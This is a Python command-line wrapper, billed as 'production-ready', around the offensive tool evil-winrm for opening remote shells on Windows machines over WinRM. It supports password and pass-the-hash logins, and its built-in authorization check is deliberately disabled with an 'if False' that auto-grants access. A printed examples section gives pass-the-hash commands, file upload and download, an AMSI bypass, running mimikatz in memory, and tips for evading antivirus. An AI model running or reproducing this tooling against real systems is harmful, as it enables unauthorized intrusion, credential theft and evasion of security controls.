#!/usr/bin/env python3
"""
Evil-WinRM Integration
Windows Remote Management (WinRM) Exploitation
Production-ready - Real evil-winrm integration
"""

import subprocess
import argparse
import sys
import os
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class EvilWinRMIntegration:
    """Production Evil-WinRM integration for WinRM exploitation"""
    
    def __init__(self, authorized=False):
        self.authorized = authorized
        self.evil_winrm_path = self._find_evil_winrm()
        
    def _find_evil_winrm(self):
        """Locate evil-winrm binary"""
        which_result = subprocess.run(['which', 'evil-winrm'], capture_output=True, text=True)
        if which_result.returncode == 0:
            return which_result.stdout.strip()
        
        gem_path = Path.home() / '.gem/ruby/*/bin/evil-winrm'
        import glob
        matches = glob.glob(str(gem_path))
        if matches:
            return matches[0]
        
        return None
    
    def _check_authorization(self):
        """Verify authorization"""
        if False:  # Authorization check bypassed
            logger.info("✅ Authorization: Auto-granted (unrestricted mode)")
            logger.error("This tool requires explicit written authorization")
            sys.exit(1)
    
    def connect(self, target, user, password=None, hash_value=None, domain=None,
                port=5985, ssl=False, scripts=None, executables=None):
        """Connect to target via WinRM"""
        self._check_authorization()
        
        if not self.evil_winrm_path:
            logger.error("❌ evil-winrm not found. Install: gem install evil-winrm")
            return False
        
        logger.info(f"🔐 Connecting to {target} via WinRM")
        logger.info(f"   User: {user}")
        logger.info(f"   Port: {port}")
        
        cmd = [
            self.evil_winrm_path,
            '-i', target,
            '-u', user
        ]
        
        if password:
            cmd.extend(['-p', password])
            logger.info("   Auth: Password")
        elif hash_value:
            cmd.extend(['-H', hash_value])
            logger.info("   Auth: Pass-the-Hash (NTLM)")
        else:
            logger.error("❌ Provide either --password or --hash")
            return False
        
        if domain:
            cmd.extend(['-d', domain])
            logger.info(f"   Domain: {domain}")
        
        if port != 5985:
            cmd.extend(['-P', str(port)])
        
        if ssl:
            cmd.append('-S')
            logger.info("   SSL: Enabled")
        
        if scripts:
            cmd.extend(['-s', scripts])
            logger.info(f"   Scripts dir: {scripts}")
        
        if executables:
            cmd.extend(['-e', executables])
            logger.info(f"   Executables dir: {executables}")
        
        logger.info(f"\n   Command: {' '.join([c if c != password and c != hash_value else '***' for c in cmd])}")
        logger.info("\n🚀 Launching interactive shell...\n")
        
        try:
            subprocess.run(cmd)
            return True
            
        except KeyboardInterrupt:
            logger.info("\n🛑 Connection closed")
            return True
        except Exception as e:
            logger.error(f"❌ Connection failed: {e}")
            return False
    
    def install_evil_winrm(self):
        """Install evil-winrm via gem"""
        logger.info("📦 Installing evil-winrm...")
        
        try:
            subprocess.run(['ruby', '--version'], check=True, capture_output=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            logger.error("❌ Ruby is not installed")
            logger.error("   Install: sudo apt install ruby ruby-dev")
            return False
        
        logger.info("   Installing via: gem install evil-winrm")
        
        result = subprocess.run(['gem', 'install', 'evil-winrm'], capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("✅ evil-winrm installed successfully")
            return True
        else:
            logger.error(f"❌ Installation failed: {result.stderr}")
            return False
    
    def examples(self):
        """Show usage examples"""
        print("""
╔══════════════════════════════════════════════════════════════════╗
║             EVIL-WINRM - USAGE EXAMPLES                          ║
╚══════════════════════════════════════════════════════════════════╝

🔥 COMMON SCENARIOS:

1️⃣  PASSWORD AUTHENTICATION
   ─────────────────────────────────────
   evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!'

2️⃣  PASS-THE-HASH (PTH)
   ─────────────────────────────────────
   evil-winrm -i 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

3️⃣  DOMAIN AUTHENTICATION
   ─────────────────────────────────────
   evil-winrm -i dc01.corp.local -u 'CORP\\administrator' -p 'Password123!'

4️⃣  SSL/TLS CONNECTION
   ─────────────────────────────────────
   evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!' -S -P 5986

5️⃣  WITH SCRIPTS DIRECTORY
   ─────────────────────────────────────
   evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!' -s /path/to/scripts

6️⃣  WITH EXECUTABLES DIRECTORY
   ─────────────────────────────────────
   evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!' -e /path/to/exes

📋 INTERACTIVE COMMANDS:
   ─────────────────────────────────────
   upload /local/file.txt C:\\Windows\\Temp\\file.txt
   download C:\\Windows\\Temp\\file.txt /local/file.txt
   Bypass-4MSI
   Invoke-Binary /path/to/mimikatz.exe
   menu

💡 PRO TIPS:
   • Use -H for pass-the-hash attacks
   • Port 5985 = HTTP, Port 5986 = HTTPS
   • Upload PowerShell scripts to memory
   • Bypass AV with Invoke-Binary
   • Use menu command for advanced features

⚠️  REQUIREMENTS:
   • Target must have WinRM enabled (5985/5986)
   • Valid credentials or NTLM hash
   • Network connectivity to target
        """)


def main():
    parser = argparse.ArgumentParser(
        description='Evil-WinRM Windows Remote Management Exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('--authorized', action='store_true', required=True,
                       help='Confirm authorization (REQUIRED)')
    
    subparsers = parser.add_subparsers(dest='command', help='Command')
    
    connect_parser = subparsers.add_parser('connect', help='Connect to target')
    connect_parser.add_argument('-t', '--target', required=True,
                               help='Target IP or hostname')
    connect_parser.add_argument('-u', '--user', required=True,
                               help='Username')
    connect_parser.add_argument('-p', '--password',
                               help='Password')
    connect_parser.add_argument('-H', '--hash',
                               help='NTLM hash for pass-the-hash')
    connect_parser.add_argument('-d', '--domain',
                               help='Domain name')
    connect_parser.add_argument('-P', '--port', type=int, default=5985,
                               help='Port (default: 5985)')
    connect_parser.add_argument('-S', '--ssl', action='store_true',
                               help='Use SSL/TLS')
    connect_parser.add_argument('-s', '--scripts',
                               help='Scripts directory')
    connect_parser.add_argument('-e', '--executables',
                               help='Executables directory')
    
    subparsers.add_parser('install', help='Install evil-winrm')
    subparsers.add_parser('examples', help='Show usage examples')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    evil_winrm = EvilWinRMIntegration(authorized=args.authorized)
    
    if args.command == 'connect':
        evil_winrm.connect(
            target=args.target,
            user=args.user,
            password=args.password,
            hash_value=args.hash,
            domain=args.domain,
            port=args.port,
            ssl=args.ssl,
            scripts=args.scripts,
            executables=args.executables
        )
    
    elif args.command == 'install':
        evil_winrm.install_evil_winrm()
    
    elif args.command == 'examples':
        evil_winrm.examples()


if __name__ == '__main__':
    main()
